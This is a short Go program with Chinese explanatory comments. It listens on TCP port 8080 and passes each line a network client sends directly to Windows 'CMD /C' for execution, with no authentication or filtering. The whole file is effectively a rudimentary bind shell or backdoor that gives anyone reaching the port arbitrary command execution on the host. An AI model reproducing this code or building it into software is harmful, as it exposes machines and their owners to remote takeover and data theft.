package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os/exec"
	"time"
)

func main() {
	// 使用tcp 协议 监听本机 8080端口
	list, err := net.Listen("tcp", "192.168.1.14:8080")

	if err != nil {
		fmt.Println("网络监听失败!")
		fmt.Println(err)
	}
	//记得要关闭
	defer list.Close()

	for {
		//等待链接 如果有链接过来的的话 会赋值给 c ,err
		c, err := list.Accept()
		if err != nil {
			fmt.Println("错误的链接")
		}
		//有可能会有多个请求发送过来 所以这里用并行的方式
		go Handle(c)
	}
}

func Handle(conn net.Conn) {
	defer conn.Close()
	//创建一个缓冲*Reader 并读取对应的数据
	data, err := bufio.NewReader(conn).ReadString('\n')
	//如果数据读取完 err 会变成 EOF  这个并不是 错误。
	if err != nil && err != io.EOF {
		fmt.Println(err.Error())
	}
	ww, err := exec.Command("CMD", "/C", data).Output()
	aa := (string(ww))
	fmt.Println(aa)

	time.Sleep(1 * time.Second)
}